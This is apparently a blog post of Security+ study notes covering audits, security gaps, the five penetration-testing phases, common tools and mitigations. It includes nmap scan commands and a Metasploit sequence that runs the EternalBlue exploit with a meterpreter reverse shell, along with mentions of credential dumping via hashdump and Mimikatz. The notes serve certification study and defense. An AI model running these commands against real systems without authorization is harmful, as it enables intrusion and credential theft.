---
title: Audit & Assessment
author: gourabdg47
date: 2025-04-16 11:24:00
categories:
  - Information
  - Security +
tags:
  - reading
  - certification
render_with_liquid: true
---

# Audit & Assessments

**Critical for identifying vulnerabilities, ensuring compliance, and hardening an organization’s security posture.**

---

### **Audits**

Systematic evaluations to verify adherence to security policies, regulations, and best practices.

1. **Internal Audits**
    
    - Conducted by the organization’s team to assess **processes, controls, and compliance** (e.g., ISO 27001, GDPR).
        
    - Example: Checking if employees follow password rotation policies.
        
2. **External Audits**
    
    - Performed by third parties (e.g., regulators, consultants) to validate security claims.
        
    - Example: PCI-DSS audit for credit card data handling.
        

---

### **Identifying Security Gaps**

Weaknesses in three key areas:

1. **Policies**
    
    - Example: Lack of an incident response plan for ransomware attacks.
        
2. **Procedures**
    
    - Example: Employees sharing passwords via unencrypted email.
        
3. **Controls**
    
    - Example: Missing multi-factor authentication (MFA) for privileged accounts.
        

**Real-World Gap**: The 2017 Equifax breach occurred due to unpatched Apache Struts (a **control gap**).

---

### **Internal Processes**

Focus on aligning workflows with security frameworks:

- **Processes**: How tasks are executed (e.g., patch management cycles).
- **Controls**: Safeguards like firewalls, access controls, and encryption.
- **Compliance**: Meeting standards like HIPAA, NIST CSF, or SOC 2.
    
---

### **Penetration Testing**

Simulating real-world attacks to exploit vulnerabilities. Follows a structured **5-phase approach**:

#### **1. Reconnaissance**

Gathering intelligence about the target.

- **Passive Reconnaissance**:
    
    - No direct interaction with the target.
        
    - Tools: **WHOIS lookup**, **Shodan** (searching exposed devices), social media (e.g., LinkedIn for employee names).
        
    - Example: Finding an outdated WordPress version via BuiltWith.
        
- **Active Reconnaissance**:
    
    - Directly probing the target.
        
    - Tools: **Nmap** (port scanning), **theHarvester** (email enumeration).
        
    - Example: `nmap -sV 192.168.1.1` to identify open ports and services.
        

#### **2. Scanning & Vulnerability Analysis**

Identifying weaknesses in systems/applications.

- Tools: **Nessus**, **OpenVAS**, **Nikto** (web server scans).
    
- Example: Using Nessus to detect a missing MS17-010 patch (EternalBlue vulnerability).
    

#### **3. Exploitation**

Launching attacks to breach systems.

- **Known Environment**: Attacker has full knowledge (e.g., internal red team).
    
    - Example: Exploiting a misconfigured S3 bucket to exfiltrate data.
        
- **Partially Known Environment**: Limited info (e.g., third-party pen-testers).
    
- **Unknown Environment** (Black Box): Zero prior knowledge.
    
    - **Live Attack Example**:
        
        1. Use `nmap -p 445 10.0.0.0/24` to find SMB ports.
            
        2. Run `msfconsole` in Metasploit.
            
        3. Exploit EternalBlue:
            
            ```bash
            nmap -p 445 10.0.0.0/24
            
			msfconsole
			use exploit/windows/smb/ms17_010_eternalblue
			set RHOSTS 10.0.0.5
			set PAYLOAD windows/x64/meterpreter/reverse_tcp
			exploit

			```
            
        4. Gain **meterpreter shell** → Dump credentials with `hashdump`.
            

#### **4. Post-Exploitation**

Maintaining access and pivoting to other systems.

- Tools: **Mimikatz** (extracting passwords from memory), **Cobalt Strike** (lateral movement).
    
- Example: Using `kiwi` in Metasploit to extract Kerberos tickets for privilege escalation.
    

#### **5. Reporting**

Documenting findings and recommending fixes.

- Example: Prioritizing EternalBlue patching and disabling SMBv1.
    

---

### **Pentesting Tools**

1. **Nmap**
    
    - Network mapping and service discovery:
        
        nmap -sS -A -T4 192.168.1.1  # Stealth SYN scan + OS detection  
        
2. **Metasploit**
    
    - Exploit development and execution framework.
        
3. **Burp Suite**
    
    - Web application testing (e.g., SQLi, XSS).
        
4. **Wireshark**
    
    - Network traffic analysis for unencrypted credentials.
        

---

### **Mitigation Strategies**

- **Patching**: Regularly update systems (e.g., EternalBlue was patched in 2017!).
    
- **Network Segmentation**: Limit lateral movement.
    
- **Web Application Firewalls (WAF)**: Block SQLi/XSS payloads.
    

---

**Exam Tips**:

- Memorize the **5 phases of penetration testing** (Recon → Scanning → Exploitation → Post-Exploit → Reporting).
    
- Know the difference between **passive** (no interaction) and **active** (direct probing) reconnaissance.
    
- Practice **Nmap flags**: `-sS` (stealth scan), `-A` (aggressive scan), `-O` (OS detection).

---

> To get in touch with me or for general discussion please visit [ZeroDayMindset Discussion](https://github.com/orgs/X3N0-G0D/discussions) 
{: .prompt-info }